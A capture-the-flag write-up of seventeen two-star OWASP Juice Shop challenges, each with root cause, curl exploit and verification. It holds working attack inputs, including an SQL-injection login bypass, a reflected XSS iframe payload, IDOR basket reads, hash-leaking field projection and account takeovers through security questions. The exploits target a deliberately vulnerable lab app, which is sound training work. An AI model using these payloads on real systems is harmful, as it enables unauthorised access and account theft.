# Two-Star Challenge Writeups (★★)

Findings **14–30** of JUICE.md "2-Star Findings" — 17 challenges, matching the register line
`★★ (17): …` **1:1** (names and count cross-checked; no drift).

**Prerequisites:** Instance is **Juice Shop v20.2.0** behind the team **MultiJuicer** proxy.
Every request needs the team `multi-juicer` session cookie, or any path `302`s to `/multi-juicer`
(cookie value `<redacted>`, base URL `<redacted>`). Two auth channels exist (see
`docs/authentication-model.md`): most `/rest`+`/api` routes read `Authorization: Bearer <jwt>`,
while `whoami`-style routes read `Cookie: token=<jwt>`. Values JUICE.md does not state are left
as `<redacted>`.

Solved (in difficulty order):
1. Security Policy — valid `security.txt`
2. Empty User Registration — empty email accepted
3. Weird Crypto — MD5 in JWT
4. Deprecated Interface — legacy B2B XML upload
5. View Basket — basket IDOR
6. Login Admin — SQLi
7. Five-Star Feedback — non-admin delete
8. Password Hash Leak — `whoami` projection
9. Exposed Credentials — creds in `main.js`
10. Admin Section — admin panel route
11. Meta Geo Stalking — John EXIF → Daniel Boone National Forest
12. Visual Geo Stalking — Emma → `ITsec`
13. Reflected XSS — track-order iframe
14. Misplaced IaC Files — `.tf`/`Dockerfile` paths
15. Password Strength — `admin123`
16. Login MC SafeSearch — lyric password
17. NFT Takeover — wallet-level team activity

## 1. Security Policy
Difficulty: ★★ | Vulnerability class: security misconfiguration (policy hygiene)
- Attack surface: `GET /.well-known/security.txt` (also `robots.txt`, `/api/Challenges/`).
- Root cause: precondition/sanity challenge — the instance must serve a *valid* RFC 9116 `security.txt` at the standard path; solved when the file is present and well-formed.
- Exploit:
  ```
  curl -i '<redacted>/.well-known/security.txt'
  ```
  Confirm `HTTP/1.1 200` and RFC 9116 structure (`Contact:`/`Expires:`/… directives).
- Verification: `/api/Challenges/` lists `Security Policy` as solved after a valid fetch.

## 2. Empty User Registration
Difficulty: ★★ | Vulnerability class: missing input validation
- Attack surface: `POST /api/Users/` (registration).
- Root cause: no server-side rejection of empty-string identifiers — an account with an empty email is accepted.
- Exploit:
  ```
  curl -s '<redacted>/api/Users/' -H 'Content-Type: application/json' \
    -H 'Authorization: Bearer <redacted>' \
    -d '{"email":"","password":"<redacted>","passwordRepeat":"<redacted>",...}'
  ```
- Verification: response returns a created user object; `Empty User Registration` flips to solved.

## 3. Weird Crypto
Difficulty: ★★ | Vulnerability class: CWE-916 (weak password hashing) / CWE-327
- Attack surface: JWT returned by `POST /rest/user/login`.
- Root cause: passwords are hashed with plain unsalted **MD5**, and the digest is embedded inside the JWT payload.
- Exploit:
  1. Log in as admin (SQLi `admin@juice-sh.op'--` or `admin123`).
  2. Decode the middle (payload) segment of `authentication.token`:
     ```
     echo '<jwt.payload.segment>' | base64 -d
     ```
  3. Read the `password` field: `0192023a7bbd73250516f069df18b500`.
  4. Cross-check: `md5('admin')` = `0192023a7bbd73250516f069df18b500`.
- Verification: `Weird Crypto` solved; admin MD5 matches the documented hash exactly.

## 4. Deprecated Interface
Difficulty: ★★ | Vulnerability class: CWE-477 (use of deprecated/legacy functionality)
- Attack surface: `POST /file-upload` (multipart field `file`).
- Root cause: the legacy B2B **XML** order interface was left active on the public upload endpoint.
- Exploit:
  ```
  curl -s '<redacted>/file-upload' -H 'Authorization: Bearer <redacted>' \
    -F 'file=@b2b-order.xml'
  ```
  Submit a document in the old B2B XML order format.
- Verification: endpoint accepts the deprecated format and `Deprecated Interface` is solved.

## 5. View Basket
Difficulty: ★★ | Vulnerability class: CWE-639 (IDOR / BOLA)
- Attack surface: `GET /rest/basket/:id`.
- Root cause: basket read is authorized only by "has a session", never by ownership of the basket.
- Exploit:
  ```
  curl -s '<redacted>/rest/basket/1' -H 'Authorization: Bearer <redacted>'
  ```
  Basket `1` is the admin's basket (`bid 1`), visible to any other valid user.
- Verification: response contains another user's basket contents; `View Basket` solved.

## 6. Login Admin
Difficulty: ★★ | Vulnerability class: CWE-89 (SQL injection)
- Attack surface: `POST /rest/user/login` — raw SQL `SELECT * FROM Users WHERE email='..' AND password='..' AND deletedAt IS NULL`.
- Root cause: the email is concatenated into the query; `--` comments out the password and `deletedAt` checks.
- Exploit:
  ```
  curl -s '<redacted>/rest/user/login' -H 'Content-Type: application/json' \
    -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}"
  ```
- Verification: returns an admin JWT (`role: admin`) in `authentication.token`; `Login Admin` solved.

## 7. Five-Star Feedback
Difficulty: ★★ | Vulnerability class: CWE-284 (improper authorization)
- Attack surface: `DELETE /api/Feedbacks/:id`.
- Root cause: deletion is allowed for non-admin users; the verifier triggers when a non-admin deletes a 5-star feedback.
- Exploit:
  1. Log in as a regular (non-admin) user, take the Bearer token.
  2. List feedback: `GET /api/Feedbacks/` and pick a 5-star entry id.
  3. ```
     curl -s -X DELETE '<redacted>/api/Feedbacks/<id>' -H 'Authorization: Bearer <redacted>'
     ```
- Verification: `Five-Star Feedback` solved after the non-admin delete.

## 8. Password Hash Leak
Difficulty: ★★ | Vulnerability class: CWE-200 (information disclosure via mass-assignment projection)
- Attack surface: `GET /rest/user/whoami?fields=...`.
- Root cause: the `?fields=` attribute projection is applied unchecked, so protected columns (`password`) can be requested.
- Exploit:
  ```
  curl -s '<redacted>/rest/user/whoami?fields=id,email,password,role' -H 'Cookie: token=<redacted>'
  ```
- Verification: JSON response includes the `password` hash (and `role`); `Password Hash Leak` solved.

## 9. Exposed Credentials
Difficulty: ★★ | Vulnerability class: CWE-798 (hard-coded credentials)
- Attack surface: static frontend bundle `main.js`; then `POST /rest/user/login`.
- Root cause: a test admin account's credentials ship inside the client-side bundle.
- Exploit:
  1. ```
     curl -s '<redacted>/main.js' | grep -o 'testing@juice-sh.op\|IamUsedForTesting'
     ```
  2. Log in with the leaked pair:
     ```
     curl -s '<redacted>/rest/user/login' -H 'Content-Type: application/json' \
       -d '{"email":"testing@juice-sh.op","password":"IamUsedForTesting"}'
     ```
- Verification: login returns an admin token; `Exposed Credentials` solved.

## 10. Admin Section
Difficulty: ★★ | Vulnerability class: CWE-284 (broken access control on UI route)
- Attack surface: SPA route `/#/administration` (browser navigation after admin login).
- Root cause: the administration panel is only reachable/gated by client-side role, which the SQLi-login bypass grants.
- Exploit:
  1. Obtain an admin session (see #6: `email=admin@juice-sh.op'--`).
  2. Inject the token into the SPA (`localStorage['token']`) and navigate to `/#/administration`.
- Verification: the admin dashboard renders; `Admin Section` solved.

## 11. Meta Geo Stalking
Difficulty: ★★ | Vulnerability class: CWE-200 (EXIF/GPS metadata disclosure) → OSINT
- Attack surface: photo asset EXIF; `POST /rest/user/reset-password` for `john@juice-sh.op`.
- Root cause: John's uploaded photo retains EXIF GPS coordinates, revealing his location and thus his security-question answer.
- Exploit:
  1. Download John's photo and dump metadata:
     ```
     exiftool john.jpg   # GPS: 36°57'31.38"N 84°20'53.58"W
     ```
  2. Reverse-geocode the coordinates → **Daniel Boone National Forest**.
  3. Reset his account with the answer:
     ```
     curl -s '<redacted>/rest/user/reset-password' -H 'Content-Type: application/json' \
       -d '{"email":"john@juice-sh.op","answer":"Daniel Boone National Forest","new":"<redacted>","repeat":"<redacted>"}'
     ```
- Verification: reset succeeds (answer HMAC matches) and `Meta Geo Stalking` is solved.

## 12. Visual Geo Stalking
Difficulty: ★★ | Vulnerability class: CWE-200 (photo content disclosure) → OSINT
- Attack surface: Emma's "old workplace" photo; `POST /rest/user/reset-password` for `emma@juice-sh.op`.
- Root cause: visual clues in the photo (building signage) identify the former employer, which is the security-question answer.
- Exploit:
  1. View Emma's photo on the photo wall and read the visible company sign.
  2. Submit the answer **`ITsec`** for `emma@juice-sh.op`:
     ```
     curl -s '<redacted>/rest/user/reset-password' -H 'Content-Type: application/json' \
       -d '{"email":"emma@juice-sh.op","answer":"ITsec","new":"<redacted>","repeat":"<redacted>"}'
     ```
- Verification: reset succeeds and `Visual Geo Stalking` is solved.

## 13. Reflected XSS
Difficulty: ★★ | Vulnerability class: CWE-79 (reflected XSS)
- Attack surface: `GET /rest/track-order/:id`.
- Root cause: the order-id path segment is reflected without encoding; the server-side verifier solves on receipt of the crafted id.
- Exploit:
  ```
  curl -s --path-as-is \
    '<redacted>/rest/track-order/%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E'
  ```
  Raw payload reflected: `<iframe src="javascript:alert(\`xss\`)">`.
- Verification: response reflects the payload unencoded and `Reflected XSS` is solved.

## 14. Misplaced IaC Files
Difficulty: ★★ | Vulnerability class: CWE-538 / CWE-540 (source-of-truth files in web root)
- Attack surface: any URL whose path ends in `.tf`, `Dockerfile`, or `docker-compose.yml`.
- Root cause: infrastructure-as-code files are served/matched by the app, leaking that they live in the deployed tree.
- Exploit:
  ```
  curl -i '<redacted>/misplaced/terraform-file.tf'
  curl -i '<redacted>/Dockerfile'
  curl -i '<redacted>/docker-compose.yml'
  ```
- Verification: server answers the crafted paths (challenge solved on request, no valid route needed).

## 15. Password Strength
Difficulty: ★★ | Vulnerability class: CWE-521 (weak password)
- Attack surface: `POST /rest/user/login` (pre-login credential check).
- Root cause: the admin account uses the trivially weak password `admin123`; the pre-login check fires before auth.
- Exploit:
  ```
  curl -s '<redacted>/rest/user/login' -H 'Content-Type: application/json' \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}'
  ```
- Verification: login succeeds and `Password Strength` is solved.

## 16. Login MC SafeSearch
Difficulty: ★★ | Vulnerability class: CWE-521 / CWE-798 (credential disclosed in content)
- Attack surface: SPA music page (lyrics); `POST /rest/user/login`.
- Root cause: MC SafeSearch's own song leaks his password in the lyrics; the account reuses it.
- Exploit:
  1. Play MC SafeSearch's track on the music page and read the lyric — the password is embedded in the text (value `<redacted>`).
  2. ```
     curl -s '<redacted>/rest/user/login' -H 'Content-Type: application/json' \
       -d '{"email":"mc.safesearch@juice-sh.op","password":"<redacted>"}'
     ```
- Verification: login returns a valid token; `Login MC SafeSearch` solved.

## 17. NFT Takeover
Difficulty: ★★ | Vulnerability class: CWE-798 / wallet-authorization failure *(team activity)*
- Attack surface: NFT unlock endpoint (`/rest/nft...`, Web3 wallet surface).
- Root cause: the unlock logic accepts the wallet private key directly, handing over the full wallet.
- Exploit: solved as **team activity** at the wallet level — the private key was accepted at the `/rest/nft...` unlock endpoint, giving full-wallet takeover; proof was submitted on the shared instance. Not replayed from the authoring session.
- Verification: `NFT Takeover` marked solved on the shared team instance (see register note on team-activity entries).
